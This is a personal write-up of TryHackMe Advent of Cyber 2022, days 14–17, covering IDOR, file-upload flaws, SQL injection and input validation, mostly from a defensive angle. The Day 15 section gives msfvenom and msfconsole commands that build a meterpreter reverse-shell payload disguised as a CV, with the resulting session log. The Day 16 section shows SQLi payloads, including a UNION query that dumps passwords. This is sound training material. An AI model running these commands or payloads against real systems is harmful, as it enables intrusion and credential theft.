- A customer, on the other hand, should be able to view but should not be able to alter the data.

- However, due to various programming or design mistakes, access control is sometimes not appropriately imposed.

### Web Application Vulnerabilities

- The OWASP was established to improve software security. 
	- The [OWASP Top 10](https://owasp.org/Top10/) list aims to raise awareness regarding common security issues that plague web applications. 
- This list would help software developers avoid common mistakes to build more secure products. 
	- Other users, such as penetration testers and bug bounty hunters, can use this list to serve their purposes.

#idor
- IDOR refers to the situation where a user can manipulate the input to bypass authorization due to poor access control. 
- IDOR was the fourth on the OWASP Top 10 list in 2013 before it was published under Broken Access Control in 2017. 
	- To learn more about IDOR, consider the following examples.

- Let’s say that a user of ID `132` is directed to the following URL after logging in to the system: `http://santagift.shop/account/user_id=132`. 
- However, they soon discover that they can browse other users’ profiles by changing the `user_id` value from `132` to other values expected to match existing user IDs. 
- Although the system should deny them access to the new URL due to lack of authorization, an IDOR vulnerability will let the user display such unauthorized pages. 
- In the figure below, the user managed to access the user’s account page with ID `101`.

![](Pasted image 20221216231338.png)
- Consider the example where requesting an invoice generates a link similar to this: `http://santagift.shop/invoices?download=115`. 
- To test for vulnerabilities, one would replace `115` with another number, as shown in the image below. 
	- The system is vulnerable if it lets them access other users’ invoices.

![](Pasted image 20221216231431.png)

- The impact of an IDOR vulnerability might let you reset the password of another user. 
- For instance, after logging in, a malicious user might start with the URL to change their password and replace their username with that of another user. 
	- For example, the attacker would replace their username `yeti` in the URL `http://santagift.shop/account/changepassword=yeti` with another valid username and attempt to change their password, as shown in the figure below. 

![](Pasted image 20221216231602.png)

### Questions

- Logged in with the given credentials:

![](Pasted image 20221216231953.png)
  
What is the office number of Elf Pivot McRed?

- Changing the 101 in the URL to a 102 gives me McBlue:

![](Pasted image 20221216232123.png)

- 105 gives me McRed:

![](Pasted image 20221216232219.png)

A: 134

Not only profile pages but also stored images are vulnerable. Start with a URL of a valid profile image; what is the hidden flag?

- Right click on an image and click `Copy Image Location` to copy the link of that image:

![](Pasted image 20221216232440.png)

![](Pasted image 20221216232510.png)

- We see that the URL is still vulnerable to IDOR
- We change the 105 into a 100 and get the flag:

![](Pasted image 20221216232556.png)


A: THM{CLOSE_THE_DOOR}

## [Day 15] `Secure Coding` Santa is looking for a Sidekick

### Input Validation

- Insufficient input validation is one of the biggest security concerns for web applications. 
- The issue occurs when user-provided input is inherently trusted by the application. 
- Since user input can also be controlled by an attacker, we can see how this inherent trust can lead to many problems. 
- Several web application vulnerabilities, such as SQL Injection, Cross Site Scripting, and Unrestricted File Upload, stem from the issue of insufficient user input validation. 

### The _Unrestricted_ in Unrestricted File Uploads

- The ability to upload files to a server has become integral to how we interact with web applications. 
- Just think of file uploads like a profile picture for a social media website, a report being uploaded to cloud storage, or saving a project on GitHub; the applications for file upload features are limitless.  
  
- Unfortunately, when poorly handled, file uploads can also open up severe vulnerabilities in the server. 
- This can lead to anything from relatively minor nuisance problems; all the way up to full Remote Code Execution (RCE) if an attacker manages to upload and execute a shell. 
- With unrestricted upload access to a server (and the ability to retrieve data at will), an attacker could deface or otherwise alter existing content -- up to and including injecting malicious webpages, which lead to further vulnerabilities such as Cross-Site Scripting (XSS) or Cross-Site Request Forgery (CSRF). 
- By uploading arbitrary files, an attacker could potentially use the server to host and/or serve illegal content or to leak sensitive information. 
- Realistically speaking, an attacker with the ability to upload a file of their choice to your server -- with no restrictions -- is very dangerous indeed.

- Unrestricted File Uploads usually have two main exploitation paths:

	-   If the attacker can retrieve the uploaded file, it could lead to code execution if the attacker uploads a file such as a web shell.
	-   If the file is viewed by a user, think of a CV application, then an attacker could embed malware in the uploaded file that would execute on the user's workstation once they view the file.

- The given website allows file uploads:

![](Pasted image 20221217145554.png)

- We can also upload `.exe` files:

![](Pasted image 20221217145726.png)

### Why the fuss over the Web Root?

- So why would the developer take care to store the file outside the web root? 
- Web servers are fairly simple things. 
	- You request a resource and the web server then responds with the resource. 
- The magic happens when a request resource has a specific file type. 
- Since this is a .NET application, the following resource types would be considered special:
	-   ASP
	-   ASPX
	-   CSHTML

- When a resource is requested with one of these file types, the web server will first execute some instructions found in these pages before sending the compiled response back to the user. 
- Here is an example of an ASPX instruction that would be executed by the server:
```aspx
<form id="Form1" method="post" runat="server" EncType="multipart/form-data" action="Upload.aspx">
```

- This tells the server that the HTML element first requires some formatting before being added to the HTML in the response, as can be seen by the `runat="server"` directive.

- If we could upload any file that we wanted, we could upload one of these special types of pages, like an ASPX webshell. 
- If this file was stored in the web root, we could request the file from the server, forcing the server to execute the code within our file before sending the response. 
- It would be possible to get remote code execution on the web server. 
	- However, as the file is stored outside of the web root, we cannot make a request that would retrieve our uploaded file for execution. 
- However, this protection is not sufficient for two main reasons:

	-   Other vulnerabilities, such as local file inclusion, may exist that allow us to force the web server itself to recover the file that was stored outside the web root. If the web server recovers the file, the code within the file will again be executed, allowing for RCE.
	-   While we cannot perhaps get RCE using this vulnerability, we know with certainty that actual users would interact with the files that we upload. Rather than targeting the web server directly, we could target the users that would interact with these files. If we were to upload a file that had malware embedded, it would execute when the user interacted with the file, still allowing us to breach Santa's perimeter!

### Shell from Santa  

- Let's try to target one of Santa's elves that would be reviewing the uploaded CVs. 
- In most cases, we would have to be quite creative with the malware that we upload, especially since this is for an application to a security role! 
- This will require us to create a CV with a malicious macro embedded. 
- However, since we are on Santa's red team and this is a security assessment, we only need to show proof of concept. 
- Let's use Metasploit to generate a malicious CV:  

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="Listening port" -f exe -o cv-username.exe`

- You can then also use the following to create the associated listener in the msfconsole:

`sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 'listening port'; exploit"`  

- Once we have our CV, we can upload the file again. Once uploaded, give it a few minutes, and one of those elves should be reviewing our CV:

```
[*] Started reverse handler on 10.50.1.120:4444 [*] Starting the payload handler... [*] Sending stage (770048 bytes) to 10.10.1.20 [*] Meterpreter session 1 opened (10.50.1.120:4444 -> 10.10.1.20:1138) at 2022-10-22 19:03:43 -0500 meterpreter >
```

- This is sufficient for a proof of concept for Elf McSkidy to take to Santa and request that additional security controls must be implemented on the application! Using your shell, go read the flag from the specific elf's home directory.

### Properly Securing File Uploads

- To adequately secure the file upload feature, we will need to implement layers of defence. 
- In this task, we will use a C# file upload as the case study. 
- C# is a popular language used to create both Windows application and web applications at large organisations. 
- Let's look at our base file upload function first:

![](Pasted image 20221217151127.png)

- As we can see, the developer made sure to store the CV outside the web root by setting the full path to a different drive (D:\CVUploads). However, this is not sufficient. Let's take a look at what additional controls can be implemented:

#### File Content Validation

- We can validate the content of the file by reviewing the ContentType header that is sent by the browser when a file is uploaded:


![](Pasted image 20221217151426.png)

- If the file content type is not PDF, we will reject the file. 
- While this is a good control, it should be noted that since the browser sets this header, an attacker could bypass this control by intercepting the request and changing the header.


### File Extension Validation

We can also verify the file extension. This will allow us to limit the type of files that can be uploaded. We can therefore add the following lines to our code:

```csharp
string contentExtension = Path.GetExtension(fileUpload);
if !(contentExtension.equals("PDF"))
    {
        allowed = False;
    }
```

- This will limit the file types to only PDFs. 
- If a user's CV is in a different format, they will have to convert their CV first. 
- This control should ideally be implemented with an allowlist, as shown above, since a blocklist can still be bypassed in certain cases.

### File Size Validation

- Attackers can also try to upload files that are so large it consumes so much disk space that other potential candidates are not able to upload their CVs. 
- To prevent this, we can implement file size validation controls:

```csharp
int contentSize = fileUpload.ContentLength;
//10Mb max file size
int maxFileSize = 10 * 1024 * 1024
if (contentSize > maxFileSize)
    {
        allowed = False;
    }
```

- This will only allow file sizes smaller than the specified amount.

### File Renaming

- As mentioned before, even though our uploads are stored outside the web root, an attacker could leverage an additional vulnerability, such as file inclusion, to execute the file. 
- To counter these attempts, we can look to rename uploaded files to random names, making it almost impossible for an attacker to recover their file by name:

```csharp
Guid id = Guid.NewGuid();
var filePath = Path.Combine(fullPath, id + ".pdf");
```

### Malware Scanning

- Even with all of the above controls implemented, there is still the risk of an attacker uploading a malicious file that targets the elves that will review the CVs. 
- Since Santa is a high-value individual, some nation-states might even use specialised exploits found in PDF readers to upload a malicious PDF in the hopes of getting access to remove themselves from Santa's naughty list! 
- In order to combat these types of malicious files, we can scan uploaded files for malware. 
- We can install a package such as ClamAV and use it to scan the contents of each uploaded file:

```csharp
var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
if (scanResult.Result == ClamScanResults.VirusDetected)
    {
        allowed = False;
    }; 
```

### Putting it all Together

- Combining all of the above techniques, we can implement a secure file upload function, as shown below:

```csharp
public IActionResult OnPostUpload(FileUpload fileUpload)
    {
        var allowed = True;

        //Store file outside the web root   
        var fullPath = "D:\CVUploads\"

        var formFile = fileUpload.FormFile;

        //Create a GUID for the file name
        Guid id = Guid.NewGuid();
        var filePath = Path.Combine(fullPath, id + ".pdf");

        //Validate the content type
        string contentType = fileUpload.ContentType.Split('/')[1].ToLower();
        if !(contentType.equals("ContentType=PDF")
            {
                allowed = False;
            }

       //Validate the content extension
       string contentExtension = Path.GetExtension(fileUpload);
       if !(contentExtension.equals("PDF"))
           {
               allowed = False;
           }

       //Validate the content size
       int contentSize = fileUpload.ContentLength;
       //10Mb max file size
       int maxFileSize = 10 * 1024 * 1024
       if (contentSize > maxFileSize)
           {
               allowed = False;
           }

       //Scan the content for malware
       var clam = new ClamClient(this._configuration["ClamAVServer:URL"],Convert.ToInt32(this._configuration["ClamAVServer:Port"])); 
       var scanResult = await clam.SendAndScanFileAsync(fileBytes);  
  
       if (scanResult.Result == ClamScanResults.VirusDetected)
           {
                allowed = False;
           };

       //Only upload if all checks are passed
       if (allowed)
       {
            using (var stream = System.IO.File.Create(filePath))
                {
                    formFile.CopyToAsync(stream);
                }
       }
    }
```

- All of these controls are required for the simple reason that we cannot inherently trust user input. 
- As such, user input must be validated and controlled! 
- Sending this feedback to the freelance developer will allow them to secure the file upload feature!

### Questions

  
What is the name given to file uploads that allow threat actors to upload any files that they want?

  A: unrestricted

What is the title of the web application developed by Santa's freelancer?  

  A: unrestricted

What is the value of the flag stored in the HR Elf's Documents directory?  

- Used the command `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.245.54 LPORT=1337 -f exe -o cv-username.exe`
-  Where the LHOST is the ip of the attacker machine and the port is a random one.
- Then used the following command to get a meterpreter shell `sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.245.54; set LPORT 1337;exploit"
`:

![](Pasted image 20221217154749.png)

- We navigate to `C:\Users\HR_Elf\Documents` and print the flag

![](Pasted image 20221217155125.png)
  
  A: THM{Naughty.File.Uploads.Can.Get.You.RCE}

What defence technique can be implemented to ensure that specific file types can be uploaded?  

  A: file extension validation

What defence technique can be used to make sure the threat actor cannot recover their file again by simply using the file name?  

  A: file renaming

What defence technique can be used to make sure malicious files that can hurt elves are not uploaded?  

  A: malware scanning

## [Day 16] `Secure Coding` SQLi’s the king, the carolers sing

#sqli #sql

### SQL Refresher

- **Structured Query Language (SQL)** is the traditional language used to ask databases for information. 
- When you build any application that relies on a database, the app will need to create SQL sentences on the fly and send them to the database engine to retrieve the required information for your app to work. 
- Luckily for you, SQL was built with simplicity in mind, and its syntax is supposed to resemble straightforward English sentences to make it easier for programmers to understand.

- But before explaining the SQL syntax, let's talk about the specific database engine used on our app: MySQL. 
- MySQL stores information in structures called tables. 
- Think of them as any table in a spreadsheet document where you have **columns** and **rows**. 

### Sending SQL Queries from PHP

- The first step is always to get a connection to the database from our code. 
- To do so, PHP includes the **mysqli** extension, which provides the `mysqli_connect()` function. 
- The function receives the IP or name of the database server as a first parameter (`$server`), followed by the username (`$user`) and password (`$pwd`), and finally, the name of the schema to use(`$schema`), which is just an identifier of the database to which we are connecting. 
- As a result, the function returns a connection handler, which can be used to send further SQL Queries. 
- Think of the connection handler as a variable that holds the connection information to the database, so that queries can be sent to it:

```php
$server="db";
$user="logistics_user";
$pwd="somePass123";
$schema="logistics";

$db=mysqli_connect($server,$user,$pwd,$schema);
```

- Once the connection is made, we can issue SQL queries using the `mysqli_query()` function. 
- The first parameter we pass to the function is the connection handler we got before, and the second parameter is a string with our SQL query:

```php
$query="select * from users where id=1";
$elves_rs=mysqli_query($db,$query);
```

- As a result of executing the query, we obtain an SQL result set and store it in the `$elves_rs` variable in our example. 
- A result set is nothing more than an object that contains the results of our query, which can be used in the rest of our program to access the resulting data.

- If you check Santa's web application, you can access an elf's profile by using a URL like this:

`http://10-10-186-197.p.thmlabs.com/webapp/elf.php?id=2`

- Depending on the number you put on the `id` parameter of the URL, you get served the profile of a different elf. 
	- Behind the curtains, this works by creating an SQL query that embeds the `id` parameter value and returns the information on the corresponding elf.

![](Pasted image 20221217233608.png)

- In code, it would look like this:

```php
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

- The first line builds an SQL query by concatenating the `$_GET['id']` variable as part of the where clause. 
- Note that in PHP, you can access any parameter in the URL as `$_GET['name_of_parameter']`. 
- This query will ask the database for all columns of the table users that correspond to the elf with a specific id. 
- The second line sends the query and returns the information of one particular elf as a result set that we store in the `$elves_rs` variable. 
- The rest of the website then parses the result set and renders the page accordingly.

- If you test the website, you can see that it works as expected. 
- You have, however, introduced an SQL injection vulnerability in your code that could allow an attacker to dump your whole database!

### SQL Injection (SQLi)

- The problem with the method shown before is that it takes untrusted input from the user and concatenates it to an SQL query without any questions asked. 
- As seen in the previous day's task, our app should thoroughly validate any input the user sends before using it. 
	- If it doesn't, unexpected things may happen.

- In the case of SQL and our example, an attacker can send SQL syntax through one of the various parameters of the app's URLs, which might end up being concatenated to some SQL query in code, potentially changing its intended purpose.

- Let's get back to the elf's profile page to understand this better. 
- Remember the application is creating a query by concatenating whatever is sent in the `id` parameter as part of the WHERE clause:

```php
$query="select * from users where id=".$_GET['id'];
```

- If the attacker sends the following through the id parameter of the URL:

`http://10-10-186-197.p.thmlabs.com/webapp/elf.php?id=-1 OR id = 4`

- When PHP concatenates "-1 OR id = 4" to our SQL statement, it will end up with this query:

```sql
select * from users where id=-1 OR id = 4
```

Suddenly, the attacker has injected some SQL syntax that, when concatenated to our original query, ends up serving the data of the elf with `id=4` for some weird reason.

![](Pasted image 20221217233952.png)

- While this example shows a harmless injection, a skilled attacker can try to get your server to run much more complex SQL queries and potentially force the database to return any data on any table they want. 
- Just as an example, look at what happens when you put the following in the `id` parameter:

`http://10-10-186-197.p.thmlabs.com/webapp/elf.php?id=-1 union all select null,null,username,password,null,null,null from users
`

- The SQL injected will make the database return all of the users and passwords of the application. 
- Santa won't like this, for sure! If you are interested in learning more about SQL injection from an attacker's perspective, you can check the [SQL injection room](https://tryhackme.com/room/sqlinjectionlm). 
- For the rest of this task, however, we will focus on the defensive side and look at ways to prevent SQL injections in our code, so don't worry too much if the above URL looks hard to understand.

### Fixing SQLi by Data Type Validation

- One of the easiest and most effective ways to prevent SQL injections is to ensure that any data that the user can manipulate that you are concatenating as part of an SQL statement is actually from the type you expect. 
- Let's go to our elf chat and click the **Run Checks** button.

- Elf Exploit should tell you that he successfully injected some SQL via the id parameter of `elf.php`. Let's open this file in our code editor and look at lines 4-5:

```php
$query="select * from users where id=".$_GET['id'];
$elves_rs=mysqli_query($db,$query);
```

-  The website takes the `id` parameter from the URL and concatenates it to an SQL query, as shown before.

- We can reasonably assume that the website expects an integer `id` to be sent. 
- To avoid injections, we can convert whatever the user inputs in the id parameter to an integer. 
- For this purpose, we will be using the `intval()` function. 
- This function will take a string and try to convert it into an integer. 
- If no valid integer is found on the string, it will return 0, which is also an integer. 

- Putting this to use, we can modify line 4 of `elf.php` to look like this:

```php
$query="select * from users where id=".intval($_GET['id']);
```

### Fixing SQLi Using Prepared Statements

- While in some cases, you may secure your code with a simple validator, there are situations where you need to allow the user to pass arbitrary strings through a parameter. 
- One example of this can be seen in the search bar of our application.

- Every time a search is done, it gets sent to search-toys.php via the `q` parameter. 
- If you ask the elves to recheck the application right now, Elf Exploit should have a way to take advantage of a vulnerability in that parameter. 
- If we open `search-toys.php` in our code editor, we can quickly see that a query is built in lines 4-5:

```php
$query="select * from toys where name like '%".$_GET['q']."%' or description like '%".$_GET['q']."%'";
$toys_rs=mysqli_query($db,$query);
```

- Here, the `q` parameter gets concatenated twice into the same SQL sentence.
- Notice that in both cases, the data in `q` is wrapped around single quotes, which is how you represent a string in SQL. 
- The problem with having PHP build the query is that the database has no other option but to trust what it is being given. 
- If an attacker somehow injects SQL, PHP will blindly concatenate the injected payload into the query string, and the database will execute it.

![](Pasted image 20221217235325.png)

- While there are a couple of ways to go about this, the safest bet is to use prepared statements to prevent SQL injections.  

- **Prepared statements** allow you to separate the syntax of your SQL sentence from the actual parameters used on your WHERE clause. 
- Instead of building a single string by concatenation, you will first describe the structure of your SQL query and use placeholders to indicate the position of your query's parameters. 
	- You will then bind the parameters to the prepared statement in a separate function call.

![](Pasted image 20221217235431.png)
- Instead of providing a single SQL query string, we will send any dynamic parameters separately from the query itself, allowing the database to stick the pieces together securely without depending on PHP or the programmer. 
- Let's see how this looks in the code.

- First, we will modify our initial query by replacing any parameter with a placeholder indicated with a question mark (`?`). 
- This will tell the database we want to run a query that takes two parameters as inputs. 
- The query will then be passed to the `mysqli_prepare()` function instead of our usual `mysqli_query()`. 
- `mysqli_prepare()` will not run the query yet but will indicate to the database to prepare the query with the given syntax. 
	- This function will return a prepared statement.

- To execute our query, MySQL needs to know the value to put on each placeholder we defined before. 
- We can use the `mysqli_stmt_bind_param()` function to attach variables to each placeholder. 
- This function requires you to send the following function parameters:

- The first parameter should be a reference to the prepared statement to which to bind the variables. 

- The second parameter is a string composed of one letter per placeholder to be bound, where letters indicate each variable's data type. 
- Since we want to pass two strings, we put `"ss"` in the second parameter, where each "s" represents a string-typed variable. 
- You can also use the letters "i" for integers or "d" for floats. 
	- You can check the full list in [PHP's documentation](https://www.php.net/manual/en/mysqli-stmt.bind-param.php).

- After that, you will need to pass the variables themselves. 
- You must add as many variables as placeholders defined with `?` in your query, which in our case, are two. 
- Notice that, in our example, both parameters have the same content, but in other cases, it may not be so.

- The resulting code for this would be as follows:

```php
$q = "%".$_GET['q']."%";
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
```

- Once we have created a statement and bound the required parameters, we will execute the prepared statement using `mysqli_stmt_execute()`, which receives the statement `$stmt` as its only parameter.

```php
mysqli_stmt_execute($stmt);
```

- Finally, when a statement has been executed, we can retrieve the corresponding result set using the `mysqli_stmt_get_result()`, passing the statement as the only parameter. 
- We'll assign the result set to the `$toys_rs` variable as in the original code.

```php
$toys_rs=mysqli_stmt_get_result($stmt);
```

- Our final resulting code should look like this:

```php
$q = "%".$_GET['q']."%";
$query="select * from toys where name like ? or description like ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $q, $q);
mysqli_stmt_execute($stmt);
$toys_rs=mysqli_stmt_get_result($stmt);
```


### Questions

What is the value of Flag1?

- Sanitized the input for id in two places:

![](Pasted image 20221217234922.png)

 A: THM{McCode, Elf McCode}

What is the value of Flag2?  

![](Pasted image 20221218000021.png)

 A: THM{KodeNRoll}

What is the value of Flag3?  

- Went to `toy.php` and added some `intval`'s on lines 4, 17 and 30.

![](Pasted image 20221218000345.png)

 A: THM{Are we secure yet?}

What is the value of Flag4?

- Just added these lines in `login.php`:

![](Pasted image 20221218001252.png)

```php
$query="select * from users where username= ? and password= ?";
$stmt = mysqli_prepare($db, $query);
mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
mysqli_stmt_execute($stmt);
$users_rs=mysqli_stmt_get_result($stmt);
```

A: THM{SQLi_who???}

## [Day 17] `Secure Coding` Filtering for Order Amidst Chaos

#regex #html5

### HTML5 and Regex

- HTML5’s built-in features help a lot with the validation of user-provided input, minimizing the need to rely on JavaScript for the same objective. 
- The `<input>` element, specifically has an array of very helpful capabilities centered around form validation.

- For instance, the `<input>` type, which can be set to specifically filter for an email, a URL, or even a file, among others, promptly checks whether or not the user-provided input fits the type of data that the form is asking for, and so, feedback on its validity is immediately returned to the user as a result.

- For even more granular control of the input being provided, regular expressions (regex) can be integrated into the mix. 
	- Simply use it in the "pattern" attribute within the `<input>` element, and you’re all set. 
	- [Here](https://www.regular-expressions.info/quickstart.html) is a nice resource to get started with regular expressions. A couple of examples are shown below.

`1. <input type="text" id="uname" name="uname" pattern="[a-zA-Z0-9]+">   2. <input type="email" id="email" name="email" pattern=".+@tryhackme\.com">`

- The pattern in the first line of code above is easily one of the most foundational regular expression patterns one can use. 
	- The instruction here is to match any strings specifically composed of only letters and numbers - an alphanumeric pattern that is case-insensitive.

- The pattern in the second line of code above is a bit more pointed in its instruction, specifying that an email can have any characters at the beginning as long as it ends with "@tryhackme.com".

### Regex 101

- This section will talk about some regex tips to get you started. 
- To match _any lowercase_ character from the English alphabet, the regex pattern is `[a-z]`. We can deconstruct it as follows:

	-   The square brackets indicate that you're trying to match _one character_ within the set of characters inside of them. 
		- For example, if we're trying to match any vowel of the English alphabet, we construct our regex as follows: `[aeiou]`. 
		- The order of the characters doesn't matter, and it will match the same.
	-   Square brackets can also accept a range of characters by adding a hyphen, as seen in our original example.
	-   You can also mix and match sets of characters within the bracket. `[a-zA-Z]` means you want to match any character from the English alphabet regardless of case, while `[a-z0-9]` means you want to match any lowercase alphanumeric character.

- We also need to talk about regex operators. 
- The simplest one is the wildcard operator, denoted by `.` . 
	- This means regex will match _any_ character, and it's quite powerful when used with the operators `*`, `+`, and `{min,max}`. 
- The asterisk or star operator is used if you don't care if the preceding token matches anything or not, while the plus operator is used if you want to make sure that it matches at least once. 
- The curly braces operator, on the other hand, specifies the number of characters you want to match. Let's look at the following examples:

	-   To match a string that is alphanumeric and case insensitive, our pattern would be `[a-zA-Z0-9]+`. 
		- The plus operator means that we want to match a string, and we don't care how long it is, as long as it's composed of letters and numbers regardless of their case.
	-   If we want to ensure that the first part of the string is composed of letters and we want it to match regardless if there are numbers thereafter, it would be `^[a-zA-Z]+[0-9]*$`. 
		- The `^` and `$` operators are called anchors, and denote the start and end of the string we want to match, respectively. 
		- Since we wanted to ensure that the start of the string is composed of only letters, adding the caret operator is required.
	-   If we want to match just lowercase letters that are in between 3 and 9 characters in length, our pattern would be `^[a-z]{3,9}$`.
	-   If we want a string that starts with 3 letters followed by _any_ 3 characters, our pattern would be `^[a-zA-Z]{3}.{3}$`.

- There's also the concept of grouping and escaping, denoted by the `()` and the `\` operators, respectively. 
- Grouping is done to manage the matching of specific parts of the regex better while escaping is used so we can match strings that contain regex operators.
- Finally, there's the `?` operator, which is used to denote that the preceding token is optional. Let's look at the following example:

-   If we want to match both _www.tryhackme.com_ and tryhackme.com, our pattern would be `^(www\.)?tryhackme\.com$`. This pattern would also avoid matching _.tryhackme.com._
	-   `^(www\.)?`: The `^` operator marks the start of the string, followed by the grouping of www and the escaped `.`, and immediately followed by the question mark operator. 
		- The grouping allowed the question mark operator to work its magic, matching both strings with or without the _www._ at the beginning.
	-   `tryhackme\.com$`: The `$` operator marks the end of the string, preceded by the string tryhackme, an escaped `.`, and the string com. 
		- If we don't escape the `.` operator, the regex engine will think that we want to match any character between tryhackme and com as well.

- It's also imperative to note that the wildcard operator can lead to laziness and, consequently misuse. As such, it's always better to use character sets through the brackets especially when we're validating input as we want it to be perfect.

Here's a table to summarize everything above:

![](Pasted image 20221218102605.png)

### The Unique Case of Free-Form Text

- All of the techniques that we have covered in this task thus far are mainly concerned with structured data - data that we already expect what it should look like. 
- However, compared to the validation of structured data, free text is more complex and not very straightforward.  

- Structured data have inherent characteristics that allow us to set them apart quite quickly. 
	- For example, names shouldn’t consist of special characters (some names have, but these can be whitelisted), and age should only consist of numbers with an absolute maximum of 3 characters. 
	- Syntax and semantic validation checks can be immediately done on them, and the chaos suddenly doesn’t seem too bad.

- In contrast, free text fields are more free-for-all, and so validations checks are more limited, and the challenge of securing it is generally vaguer. 
- Yet, like all great engineers before us, we power through these challenges and make the best with what we’re given. 
- Listed below are some considerations to ponder on.

	-   First, we start again with the question of how this piece of data is going to be processed by the rest of the application.
	-   What will be the context for which this free-form text field will be used? Free text fields for blog posts are tackled very differently than text fields used for a small comment section or a descriptive text field.
	-   Is the free text field necessary for your business purposes in the first place, or could it be implemented differently while still achieving the same goal? This is essential to know, too, as part of writing secure code is avoiding writing vulnerable ones!

- Then we go to the tricky part. 
- Since syntax and semantic checks are pretty much impossible due to the nature of free-form text fields, our best bet in having a bit of control is through whitelisting. 
- This [OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#validating-free-form-unicode-text) lists down the general techniques to perform whitelisting, which can be summarized as follows:

1.  Ensure no invalid characters are present through proper encoding, and
2.  Whitelist expected characters and character sets

### Best Remediation Tactic  

- For the next part of the discussion, let’s take a look at the simple base code below wherein a programmer attempts to retrieve the usual details from a user.

![Base Code](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/944be37798d52b534749b314d6c90849.png)  

- The example is a bit bare and would have been an immediate nightmare as it raises many alarms not only in terms of security, but also in terms of risking getting a ton of garbage responses. 
- Since all of them are text inputs by default, the birthday and age fields may receive responses that aren’t within their specific context. 
- Further, malicious users have free reign over the fields, essentially allowing them a free playground to tinker with.

- This is the case if no input validation is done at all. 
	- Let’s fix it up a bit and review it again.
 
![Edited Base Code to Include Type Attribute](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/a7484e2056785655394786a397857a5f.png)  

- The changes above are literally just additions of the _type_ attribute and their corresponding values within the input element. 
- Yet, there’s already a world of difference between this one and the base implementation prior. 
- Take note that security wasn’t the main focus of these changes, yet it succeeds in mainly alleviating the chaos that the prior implementation otherwise invited. 
- Going back to the discussion above, this is an example of the syntax check being done in the HTML layer.

- However, the implementation above is still susceptible to misuse, especially for very naughty users. 
- Let’s fix it up further and review it again.

![Further Edit of Base Code to Include Semantic and Whitelisting Techniques](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/4b0203a837d72f92684f35c8bd1d00b6.png)  

The changes done above incorporate both semantic checking and whitelisting techniques to the existing syntax checking in the prior implementation in order to further filter out allowed values that can be provided in the input fields.

1.  The name field, for instance, has been written to allow a maximum of 70 characters - still quite long but somewhat reasonable. This can further be filtered granularly by blacklisting numbers and special symbols, but for our purposes, let’s accept this one for now.
2.  The date field is tweaked, so the earliest date it would allow is in the year 1900, while the latest date is in 2014, with the working assumption that the youngest user of the website would be eight years old.
3.  The email field has also been revamped to only accept tryhackme emails, while the URL field is further narrowed down to only accept tryhackme rooms as the answer to the ‘favewebsite’ field.

- These semantic checks should follow the proper business context to be effective. 
	- For example, the implementation above is geared towards the tryhackme staff, marked by the email field only accepting tryhackme emails. 
- Furthermore, applying the foundations of input validation not only ensures that the data being provided is proper, but it also drastically limits the attack surface of the input fields, especially those requiring structured data.

- This is the reason why we haven’t touched the `<textarea>` field at the very end of the code block. 
	- As discussed earlier, free-form text is unique in such a way that applying syntax and semantic checks are pretty much impossible. 
- In order to secure this one, we would first need to define what content (e.g. characters, character sets, symbols, etc.) is acceptable and then perform the actual whitelisting. 
	- Even then, it wouldn’t be enough as it’s still a very open field, and so techniques such as output escaping and using parametrized queries, among others, should be implemented as well.

### Client-side vs Server-side

- Our discussion until this point has been geared towards using input validation to ensure that the pieces of data that we're getting from the users are not garbage. 
- Proper input validation on the client-side limits misuse and minimizes the attack surface of the application, however, it doesn't actively cover malicious use cases.  

- As opposed to the above examples of validating input implemented on the client-side, output escaping and using parametrized queries are implemented on the server-side, adding computational load to the server, but ultimately helping in securing the application as a whole. 
	- This is done as an exercise of inherent distrust in the user-provided input despite validation. 

- The example below uses the built-in `htmlentities()` PHP function to escape any character that can affect the application.

`$name = htmlentities($_GET['name'], ENT_QUOTES | ENT_HTML5, "UTF-8")`

- On the other hand, the one below uses the HTMLPurifier library to help with some use cases, such as our `<textarea>` conundrum above. 

![Purifier Example](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/f66f8bfc285d5d43cfcaea4834ff6adb.png)

- Both examples are done on the server-side to escape characters and purify content, respectively both effective ways to prevent user misuse and XSS attacks. 
- Implementing both client and server-side validations ensure that no stones are left unturned.

- This exact case highlights the importance of layering defenses and shows point-blank the limitation of client-side input validation. 
- It also gives rise to the notion that input validation is not a one-stop shop for securing your application.

- Specific cases warrant specific security requirements, and so on this factor alone, it’s already apparent that there exist multiple ways of attacking the challenge of securing user-provided input, and most of the time, they are implemented on top of each other.

### Not All Solutions are Equal

- Input validation is an important layer of security that all production-level applications should have. 
- However, no matter how ‘perfect’ your input validation is for your specific use case, there simply are limitations to all kinds of security implementations - and input validation is not exempt from it.

- You cannot make your application fully XSS-proof through input validation alone. 
	- Controls may be put in place at the input level that may lessen the attack surface of the application, but it doesn’t fully remediate it. 
- Full remediation of an XSS vulnerability in your application requires additional layers of defenses, such as mitigation on the browser-level (via secure cookies, content-security-policy headers, etc.) and escaping and purifying user-provided input.

- In light of these remediation techniques, it makes sense to tackle each challenge on its own - SQL and LDAP-related vulnerabilities are addressed differently from XSS, so why try to fit them all in the same formula?

### Summary

- Despite being a very important security control, due diligence in securing applications involving user-provided input should not stop in validating the input per se. 
	- As seen in previous examples, user input may be valid, but it doesn’t necessarily mean that it’s harmless.

- There are a lot of tools and frameworks out there that when used properly can help secure your application. 
	- For instance, HTML5's features can help in minimizing input form misuse, while the use of regular expressions can help filter out what we need from the user more granularly. 
- We took a closer look at regex here especially because of its powerful capability to implement filters.

